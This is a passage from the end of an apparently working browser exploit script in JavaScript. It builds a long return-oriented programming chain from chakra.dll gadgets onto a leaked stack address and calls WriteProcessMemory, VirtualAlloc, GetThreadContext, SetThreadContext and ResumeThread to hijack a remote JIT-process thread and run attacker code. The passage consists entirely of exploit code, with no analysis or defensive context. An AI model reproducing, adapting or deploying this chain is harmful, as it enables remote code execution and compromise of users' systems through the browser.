    write64(stack_leak[0] + counter, stack_leak[1], pop_r8, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mapped_address_ptr, chakra_hi); counter += 0x8;  // LPVOID lpBuffer
    write64(stack_leak[0] + counter, stack_leak[1], pop_rdx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74b000+rop_offset_1, chakra_hi); counter += 0x8;  // LPVOID lpAddress
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0xffffffff, 0xffffffff); counter += 0x8;  // HANDLE hProcess

    write64(stack_leak[0] + counter, stack_leak[1], writeproccessmemory, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // SIZE_T *lpNumberOfBytesWritten
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;

    // WriteProcessMemory
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x72e128, chakra_hi); counter += 0x8;  // any non NULL address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000008, 0x00000000); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_r9_rcx, chakra_hi); counter += 0x8;  // SIZE_T nSize
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_r8, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mapped_address_ptr, chakra_hi); counter += 0x8;  // LPVOID lpBuffer
    write64(stack_leak[0] + counter, stack_leak[1], pop_rdx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74b000+rop_offset_2, chakra_hi); counter += 0x8;  // LPVOID lpAddress
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0xffffffff, 0xffffffff); counter += 0x8;  // HANDLE hProcess

    write64(stack_leak[0] + counter, stack_leak[1], writeproccessmemory, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // SIZE_T *lpNumberOfBytesWritten
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;

    // VirtualAlloc
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x72e128, chakra_hi); counter += 0x8;  // any writable address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000004, 0x00000000); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_r9_rcx, chakra_hi); counter += 0x8;  // DWORD flProtect
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_r8, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00003000, 0x00000000); counter += 0x8;  // DWORD flAllocationType
    write64(stack_leak[0] + counter, stack_leak[1], pop_rdx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x000004d0, 0x00000000); counter += 0x8;  // SIZE_T dwSize
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000000, 0x00000000); counter += 0x8;
    virtualalloc = kernelbase_lo + 0x5ac10;
    write64(stack_leak[0] + counter, stack_leak[1], virtualalloc, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;

    context_ptr = kernelbase_lo+0x21a100;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], context_ptr, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_prcx_rax, chakra_hi); counter += 0x8;

    // Context.ContextFlags = 0x10001f
    mov_peax_ecx = chakra_lo+0x6604e;  // mov dword [rax+0x30], ecx; ret;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x0010001f, 0x00000000); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_peax_ecx, chakra_hi); counter += 0x8;

    // GetThreadContext
    mov_rdx_rax = chakra_lo + 0x435f21;  // mov rdx, rax ; mov rax, rdx ; add rsp, 0x28 ; ret;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rdx_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // any writable address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], remotethreadhandle, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rcx_prcx, chakra_hi); counter += 0x8;

    getthreadcontext = kernelbase_lo + 0x72d10;
    write64(stack_leak[0] + counter, stack_leak[1], getthreadcontext, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;

    add_rax_rcx = chakra_lo+0x24e53b;  // add rax, rcx; ret;
    mov_prax_rcx = chakra_lo+0x4f1bc5;  // mov qword [rax], rcx; ret;
    mov_rax_prax = chakra_lo+0x2703df;  // mov rax, qword [rax+0x08]; ret;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], context_ptr - 0x8, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rax_prax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x000000f8, 0x00000000); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], add_rax_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx+1, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_prax_rcx, chakra_hi); counter += 0x8;

    // WriteProcessMemory
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x72e128, chakra_hi); counter += 0x8;  // any non NULL address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00001000, 0x00000000); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_r9_rcx, chakra_hi); counter += 0x8;  // SIZE_T nSize
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_r8, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74b000+rop_begin, chakra_hi); counter += 0x8;  // LPVOID lpBuffer


    mov_rdx_prax = chakra_lo+0x37d21a;  // mov rdx, qword [rax+rcx*8] ; mov rax, rdx ; ret ;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], context_ptr - 0x8, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rax_prax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x00000013, 0x00000000); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rdx_prax, chakra_hi); counter += 0x8;  // LPVOID lpaddress
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // any writable address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], full_jit_handle, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rcx_prcx, chakra_hi); counter += 0x8;

    write64(stack_leak[0] + counter, stack_leak[1], writeproccessmemory, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // SIZE_T *lpNumberOfBytesWritten
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;

    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], context_ptr - 0x8, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rax_prax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rdx_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // any writable address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], remotethreadhandle, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rcx_prcx, chakra_hi); counter += 0x8;

    setthreadcontext = kernelbase_lo + 0x7aa0;
    write64(stack_leak[0] + counter, stack_leak[1], setthreadcontext, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;

    resumethread = kernelbase_lo + 0x70a50;
    write64(stack_leak[0] + counter, stack_leak[1], pop_rax, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x74e100, chakra_hi); counter += 0x8;  // any writable address
    write64(stack_leak[0] + counter, stack_leak[1], pop_rcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], remotethreadhandle, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], mov_rcx_prcx, chakra_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], resumethread, kernelbase_hi); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], chakra_lo+0x243949, chakra_hi); counter += 0x8;  // KERNELBASE!DuplicateHandle return address (add rsp, 0x38; ret;)
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
    write64(stack_leak[0] + counter, stack_leak[1], 0x90909090, 0x90909090); counter += 0x8;
}
</script>
